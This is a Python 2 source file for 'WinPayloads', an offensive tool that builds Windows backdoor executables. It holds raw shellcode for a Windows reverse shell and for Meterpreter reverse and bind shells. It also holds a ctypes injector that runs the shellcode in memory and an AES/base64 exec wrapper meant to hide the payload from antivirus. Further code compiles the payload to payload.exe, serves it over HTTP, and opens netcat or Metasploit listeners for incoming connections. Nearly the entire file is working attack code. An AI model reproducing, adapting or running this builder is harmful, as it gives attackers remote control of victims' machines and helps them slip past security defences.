#!/usr/bin/python
import os
import socket
import re
import subprocess
import struct
import sys
import blessings
import random
import SimpleHTTPServer
import SocketServer
import multiprocessing
from Crypto.Cipher import AES
import base64
import string

t = blessings.Terminal()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('google.com', 0))
IP = s.getsockname()[0]


def ServePayload():
    os.chdir(payloaddir)
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(('', 8000), Handler)
    httpd.serve_forever()


def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
    BLOCK_SIZE = 32
    PADDING = '{'
    imports = list()
    output = list()

    def randKey(bytes):
        return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

    def randVar():
        return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

    def pad(s):
        return str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING

    def EncodeAES(c, s):
        return base64.b64encode(c.encrypt(pad(s)))

    def DecodeAES(c, e):
        return c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    key, iv = randKey(32), randKey(16)

    input = filecontents.split('\n')
    pieces = filecontents.split(".")

    newoutput = ''

    for line in input:
        if not line.startswith("#"):
            if "import" in line:
                imports.append(line.strip())
            else:
                output.append(line)

    cipherEnc = AES.new(key)

    encrypted = EncodeAES(cipherEnc, "".join(output))

    b64var, aesvar = randVar(), randVar()

    imports.append("from base64 import b64decode as %s" % (b64var))
    imports.append("from Crypto.Cipher import AES as %s" % (aesvar))

    random.shuffle(imports)

    newoutput = ";".join(imports) + "\n"

    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode(
        "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
    return newoutput

windows_rev_shell = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    "\xdf\xe0\xff\xd5\x97\x6a\x05\x68%s\x68"
    "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

windows_met_rev_shell = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    "\xff\xd5\x6a\x05\x68%s\x68\x02\x00%s"
    "\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
    "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
    "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
    "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
    "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
    "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
    "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
    "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
    "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
    "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
    "\xb5\xa2\x56\x6a\x00\x53\xff\xd5")

windows_met_bind_shell = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
    "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    "\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
    "\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00%s\x89"
    "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
    "\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
    "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
    "\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
    "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
    "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")

linux_x86_met_rev_shell = ('placeholder%s%s')

payload, payloadchoice, payloaddir, ez2read_shellcode = '', '', '/etc/winpayloads', ''

try:
    os.mkdir(payloaddir)
except OSError:
    pass

print t.clear
print '=' * t.width + t.bold_red
print " _       ___       ____              __                __".center(t.width)
print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
print "   /____/".center(t.width)
print t.normal + '=' * t.width

try:
    print '[1] Windows Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Placeholder'.center(t.width)
    print '=' * t.width
    menuchoice = raw_input('> ')
    if menuchoice == '1':
        payloadchoice = windows_rev_shell
        payload = 'Windows Reverse Shell'
    elif menuchoice == '2':
        payloadchoice = windows_met_rev_shell
        payload = 'Windows Meterpreter Reverse Shell'
    elif menuchoice == '3':
        payloadchoice = windows_met_bind_shell
        payload = 'Windows Meterpreter Bind Shell'
    elif menuchoice == '4':
        payloadchoice = linux_x86_met_rev_shell
        payload = 'Placeholder '
    else:
        print t.bold_red + '[*] Wrong Selection' + t.normal
        sys.exit(1)

    print t.bold_green + '\n[*] Payload Set As %s\n' % (payload) + t.normal

    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
        portnum = raw_input(
            '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
        ipaddr = raw_input(
            '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
        if len(ipaddr) is 0:
            ipaddr = IP
        if len(portnum) is 0:
            portnum = 4444
        print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
        ip1, ip2, ip3, ip4 = ipaddr.split('.')
        iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
        porthex = struct.pack('>h', int(portnum))
        shellcode = payloadchoice % (iphex, porthex)
    elif menuchoice == '3':
        bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
        if len(bindport) is 0:
            bindport = 4444
        bindporthex = struct.pack('>h', int(bindport))
        shellcode = payloadchoice % (bindporthex)

    for x in shellcode:
        ez2read_shellcode += '\\x%s' % x.encode('hex')

    shellcode = ez2read_shellcode

    injectwindows = """#/usr/bin/python
import ctypes


shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
""" % shellcode

    with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
        Filesave.write(PyCipher(injectwindows))
        Filesave.close()

    print '[*] Creating Payload.exe From Payload.py...'

    subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                     '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print '[*] Cleaning Up...'
    os.system('mv %s/dist/payload.exe %s/payload.exe' %
              (payloaddir, payloaddir))
    os.system('rm %s/logdict*' % os.getcwd())
    os.system('rm %s/dist -r' % payloaddir)
    os.system('rm %s/build -r' % payloaddir)
    os.system('rm %s/*.spec' % payloaddir)
    #os.system('rm %s/payload.py' % payloaddir)

    print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal

    want_to_upload = raw_input(
        '[*] Upload To Local Websever? [y]/n: ')
    if want_to_upload.lower() == 'y' or want_to_upload == '':
        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
        t = multiprocessing.Process(target=ServePayload)
        t.start()

    if menuchoice == '1':
        os.system('nc -lvp %s' % portnum)
    elif menuchoice == '2':
        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;exploit\'' % portnum)
    elif menuchoice == '3':
        bindip = raw_input(
            '\n[*] Enter Target Ip Address For Metasploit To Connect To The Bind Shell\n[*] IP> ')
        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;exploit \'' % (bindport, bindip))
    elif menuchoice == '4':
        os.system('msfconsole -x \'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;exploit\'' % portnum)
except KeyboardInterrupt:
    sys.exit(1)
